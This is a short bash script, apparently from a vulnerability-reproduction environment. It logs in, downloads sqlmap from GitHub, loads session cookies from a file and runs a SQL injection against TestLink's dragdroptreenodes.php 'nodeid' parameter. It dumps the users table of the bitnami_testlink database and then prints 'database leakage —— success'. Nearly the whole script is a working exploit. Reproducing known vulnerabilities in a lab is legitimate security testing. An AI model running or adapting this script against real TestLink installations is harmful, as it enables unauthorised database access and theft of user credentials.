#!/bin/bash
sleep 120
python3 /app/login.py
wget -q 'https://github.com/sqlmapproject/sqlmap/tarball/master' --output-document=./sqlmapproject-sqlmap.tar.gz
mkdir ./sqlmap && tar -xzvf sqlmapproject-sqlmap.tar.gz -C ./sqlmap --strip-components 1 >>1.txt
cd sqlmap

sum=0
declare -a indexed_arr
for line in `cat /app/temp`
do
    indexed_arr[sum]=$line
    echo ${indexed_arr[sum]}
    sum+=1
done

python3 sqlmap.py -u http://web/lib/ajax/dragdroptreenodes.php \
--data="doAction=changeParent&oldparentid=41&newparentid=41&nodelist=47%2C45&nodeorder=0&nodeid=47" \
-p nodeid \
--cookie="PHPSESSID=${indexed_arr[0]};TESTLINK1920TESTLINK_USER_AUTH_COOKIE=${indexed_arr[1]}" \
--dump -D bitnami_testlink -T users \
--answers="follow=n" \
-v 0

echo "database leakage —— success"

